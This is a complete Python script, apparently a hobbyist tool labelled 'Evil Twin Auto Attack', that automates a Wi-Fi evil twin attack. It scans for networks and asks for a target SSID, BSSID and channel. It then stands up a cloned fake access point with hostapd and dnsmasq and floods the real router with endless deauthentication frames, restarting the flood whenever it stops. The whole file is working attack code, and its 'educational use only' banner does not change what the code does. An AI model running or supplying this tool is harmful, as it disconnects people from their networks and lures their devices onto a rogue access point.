#!/usr/bin/env python3
"""
╔══════════════════════════════════════════════════════════════╗
║           EVIL TWIN AUTO ATTACK — by limox / BYTEX           ║
║     Educational use only. Test on YOUR OWN network only.     ║
╚══════════════════════════════════════════════════════════════╝
"""

import os
import sys
import time
import signal
import subprocess
import threading
import shutil
import tempfile

# ── COLORS ──────────────────────────────────────────────────────────────────
R  = "\033[91m"
G  = "\033[92m"
Y  = "\033[93m"
C  = "\033[96m"
W  = "\033[97m"
DIM = "\033[2m"
RESET = "\033[0m"
BOLD = "\033[1m"

BANNER = f"""
{R}╔══════════════════════════════════════════════════════════════╗
║{W}           EVIL TWIN AUTO ATTACK — limox / BYTEX              {R}║
║{DIM}     Educational use only. Test on YOUR OWN network only.{RESET}{R}     ║
╚══════════════════════════════════════════════════════════════╝{RESET}
"""

# ── HELPERS ─────────────────────────────────────────────────────────────────
def run(cmd, shell=True, check=False, capture=False):
    if capture:
        return subprocess.run(cmd, shell=shell, check=check,
                              stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    return subprocess.run(cmd, shell=shell, check=check)

def check_root():
    if os.geteuid() != 0:
        print(f"{R}[!] Run as root: sudo python3 eviltwin_auto.py{RESET}")
        sys.exit(1)

def check_tools():
    tools = ["airmon-ng", "airodump-ng", "aireplay-ng", "hostapd", "dnsmasq"]
    missing = [t for t in tools if not shutil.which(t)]
    if missing:
        print(f"{Y}[!] Missing tools: {', '.join(missing)}{RESET}")
        print(f"{C}[*] Installing...{RESET}")
        run("apt install -y hostapd dnsmasq aircrack-ng 2>/dev/null")

def get_interfaces():
    result = run("iwconfig 2>/dev/null", capture=True)
    lines = result.stdout.decode()
    ifaces = []
    for line in lines.split("\n"):
        if "IEEE" in line or "no wireless" in line:
            iface = line.split()[0]
            if iface:
                ifaces.append(iface)
    return ifaces

def detect_interfaces():
    """Auto-detect which interface to use for monitor vs AP"""
    result = run("iw dev", capture=True).stdout.decode()
    ifaces = []
    current = None
    for line in result.split("\n"):
        line = line.strip()
        if line.startswith("Interface"):
            current = line.split()[1]
            ifaces.append(current)
    return ifaces

def cleanup(hostapd_proc, dnsmasq_proc, deauth_proc, mon_iface, ap_iface):
    print(f"\n{Y}[*] Cleaning up...{RESET}")
    for proc in [hostapd_proc, dnsmasq_proc, deauth_proc]:
        if proc and proc.poll() is None:
            proc.terminate()
    time.sleep(1)
    run(f"airmon-ng stop {mon_iface} 2>/dev/null")
    run("systemctl restart NetworkManager 2>/dev/null")
    run(f"ip addr flush dev {ap_iface} 2>/dev/null")
    print(f"{G}[+] Cleanup done. Internet restored.{RESET}")

# ── PHASE 1: SCAN ────────────────────────────────────────────────────────────
def phase_scan(mon_iface):
    print(f"\n{C}[*] Starting network scan on {mon_iface}...{RESET}")
    print(f"{Y}[!] Watch the list — press {BOLD}Ctrl+C{RESET}{Y} when you see your target.{RESET}\n")
    time.sleep(2)
    try:
        subprocess.run(f"airodump-ng {mon_iface}", shell=True)
    except KeyboardInterrupt:
        pass
    print(f"\n{G}[+] Scan stopped.{RESET}")

# ── PHASE 2: GET TARGET INFO ─────────────────────────────────────────────────
def phase_get_target():
    print(f"\n{C}{'─'*60}{RESET}")
    print(f"{W}{BOLD} Enter your target details:{RESET}")
    print(f"{C}{'─'*60}{RESET}")
    ssid    = input(f"{G} SSID    (network name)  : {W}").strip()
    bssid   = input(f"{G} BSSID   (MAC address)   : {W}").strip()
    channel = input(f"{G} Channel (number)        : {W}").strip()
    print(f"{C}{'─'*60}{RESET}")
    print(f"\n{Y}[*] Target confirmed:{RESET}")
    print(f"    SSID    : {W}{ssid}{RESET}")
    print(f"    BSSID   : {W}{bssid}{RESET}")
    print(f"    Channel : {W}{channel}{RESET}")
    confirm = input(f"\n{Y}[?] Looks correct? (y/n): {W}").strip().lower()
    if confirm != 'y':
        print(f"{R}[!] Aborted.{RESET}")
        sys.exit(0)
    return ssid, bssid, channel

# ── PHASE 3: WRITE CONFIGS ───────────────────────────────────────────────────
def write_hostapd_conf(ssid, channel, ap_iface):
    conf = f"""interface={ap_iface}
driver=nl80211
ssid={ssid}
hw_mode=g
channel={channel}
macaddr_acl=0
ignore_broadcast_ssid=0
"""
    path = "/tmp/eviltwin_hostapd.conf"
    with open(path, "w") as f:
        f.write(conf)
    print(f"{G}[+] hostapd config written → {path}{RESET}")
    return path

def write_dnsmasq_conf(ap_iface):
    conf = f"""interface={ap_iface}
dhcp-range=192.168.1.2,192.168.1.30,255.255.255.0,12h
dhcp-option=3,192.168.1.1
dhcp-option=6,192.168.1.1
server=8.8.8.8
log-queries
log-dhcp
"""
    path = "/tmp/eviltwin_dnsmasq.conf"
    with open(path, "w") as f:
        f.write(conf)
    print(f"{G}[+] dnsmasq config written → {path}{RESET}")
    return path

# ── PHASE 4: LAUNCH ATTACK ───────────────────────────────────────────────────
def phase_attack(ssid, bssid, channel, mon_iface, ap_iface):
    print(f"\n{R}{'═'*60}{RESET}")
    print(f"{R}{BOLD}  LAUNCHING EVIL TWIN ATTACK{RESET}")
    print(f"{R}{'═'*60}{RESET}\n")

    # Write configs
    hostapd_conf = write_hostapd_conf(ssid, channel, ap_iface)
    dnsmasq_conf = write_dnsmasq_conf(ap_iface)

    # Set up AP interface IP
    print(f"{C}[*] Configuring {ap_iface} interface...{RESET}")
    run(f"ip addr flush dev {ap_iface} 2>/dev/null")
    run(f"ip addr add 192.168.1.1/24 dev {ap_iface}")
    run(f"ip link set {ap_iface} up")
    time.sleep(1)

    # Kill any existing dnsmasq
    run("pkill dnsmasq 2>/dev/null")
    time.sleep(0.5)

    # Start hostapd (fake AP)
    print(f"{C}[*] Starting fake AP (hostapd)...{RESET}")
    hostapd_proc = subprocess.Popen(
        f"hostapd {hostapd_conf}",
        shell=True,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE
    )
    time.sleep(2)
    if hostapd_proc.poll() is not None:
        err = hostapd_proc.stderr.read().decode()
        print(f"{R}[!] hostapd failed to start:{RESET}\n{err}")
        print(f"{Y}[*] Try: sudo systemctl stop hostapd first{RESET}")
        sys.exit(1)
    print(f"{G}[+] Fake AP broadcasting as: {BOLD}{ssid}{RESET}")

    # Start dnsmasq (DHCP)
    print(f"{C}[*] Starting DHCP server (dnsmasq)...{RESET}")
    dnsmasq_proc = subprocess.Popen(
        f"dnsmasq -C {dnsmasq_conf} -d",
        shell=True,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE
    )
    time.sleep(1)
    print(f"{G}[+] DHCP server running on 192.168.1.1{RESET}")

    # Start infinite deauth
    print(f"{C}[*] Starting continuous deauth attack on real router...{RESET}")
    deauth_proc = subprocess.Popen(
        f"aireplay-ng --deauth 0 -a {bssid} {mon_iface}",
        shell=True,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE
    )
    time.sleep(1)
    print(f"{G}[+] Deauth running — real router being blocked{RESET}")

    # STATUS
    print(f"\n{R}{'═'*60}{RESET}")
    print(f"{G}{BOLD}  ATTACK ACTIVE{RESET}")
    print(f"{R}{'═'*60}{RESET}")
    print(f"{W}  Fake AP      : {G}{ssid} (192.168.1.1){RESET}")
    print(f"{W}  Real router  : {R}BLOCKED ({bssid}){RESET}")
    print(f"{W}  Any device connecting to {ssid} gets NO internet.{RESET}")
    print(f"\n{Y}  Press {BOLD}Ctrl+C{RESET}{Y} to stop the attack and restore everything.{RESET}")
    print(f"{R}{'═'*60}{RESET}\n")

    # Keep alive + handle Ctrl+C
    try:
        while True:
            # Check if processes are still alive
            if hostapd_proc.poll() is not None:
                print(f"{R}[!] hostapd died unexpectedly{RESET}")
                break
            if deauth_proc.poll() is not None:
                print(f"{Y}[!] Deauth process ended — restarting...{RESET}")
                deauth_proc = subprocess.Popen(
                    f"aireplay-ng --deauth 0 -a {bssid} {mon_iface}",
                    shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE
                )
            time.sleep(3)
    except KeyboardInterrupt:
        pass
    finally:
        cleanup(hostapd_proc, dnsmasq_proc, deauth_proc, mon_iface, ap_iface)

# ── MAIN ─────────────────────────────────────────────────────────────────────
def main():
    os.system("clear")
    print(BANNER)
    check_root()
    check_tools()

    # Detect interfaces
    print(f"{C}[*] Detecting wireless interfaces...{RESET}")
    run("airmon-ng check kill 2>/dev/null")
    time.sleep(1)

    ifaces = detect_interfaces()
    if len(ifaces) < 2:
        print(f"{R}[!] Need at least 2 wireless interfaces.{RESET}")
        print(f"{Y}    Found: {ifaces}{RESET}")
        print(f"{Y}    Plug in your USB adapter and try again.{RESET}")
        sys.exit(1)

    # Show detected interfaces
    print(f"{G}[+] Found {len(ifaces)} wireless interfaces:{RESET}")
    for i, iface in enumerate(ifaces):
        result = run(f"iw dev {iface} info 2>/dev/null", capture=True).stdout.decode()
        driver = run(f"ethtool -i {iface} 2>/dev/null | grep driver", capture=True).stdout.decode().strip()
        print(f"    [{i}] {W}{iface}{RESET}  {DIM}{driver}{RESET}")

    # Auto-assign: enable monitor on wlan1 (USB), use wlan0 for AP
    # wlan1 = USB adapter (MT7601U) → monitor mode
    # wlan0 = built-in Qualcomm → AP mode
    mon_iface = None
    ap_iface  = None

    for iface in ifaces:
        info = run(f"iw dev {iface} info 2>/dev/null", capture=True).stdout.decode()
        if "MT7601U" in run(f"airmon-ng 2>/dev/null | grep {iface}", capture=True).stdout.decode() or iface == "wlan1":
            mon_iface = iface
        else:
            ap_iface = iface

    if not mon_iface or not ap_iface:
        # fallback
        mon_iface = ifaces[1] if len(ifaces) > 1 else ifaces[0]
        ap_iface  = ifaces[0]

    print(f"\n{Y}[*] Auto-assigned:{RESET}")
    print(f"    Monitor/Deauth : {W}{mon_iface}{RESET} (USB adapter — LB-LINK)")
    print(f"    Fake AP host   : {W}{ap_iface}{RESET} (built-in Qualcomm)\n")

    # Enable monitor mode on mon_iface
    print(f"{C}[*] Enabling monitor mode on {mon_iface}...{RESET}")
    run(f"airmon-ng start {mon_iface} 2>/dev/null")
    time.sleep(2)

    # Check if monitor mode is wlan1 or wlan1mon
    check = run(f"iwconfig {mon_iface} 2>/dev/null", capture=True).stdout.decode()
    if "Monitor" not in check:
        # try wlan1mon
        check2 = run(f"iwconfig {mon_iface}mon 2>/dev/null", capture=True).stdout.decode()
        if "Monitor" in check2:
            mon_iface = mon_iface + "mon"
    print(f"{G}[+] Monitor mode active on: {mon_iface}{RESET}")

    # Phase 1: Scan
    phase_scan(mon_iface)

    # Phase 2: Get target
    ssid, bssid, channel = phase_get_target()

    # Phase 3+4: Launch
    phase_attack(ssid, bssid, channel, mon_iface, ap_iface)

if __name__ == "__main__":
    main()
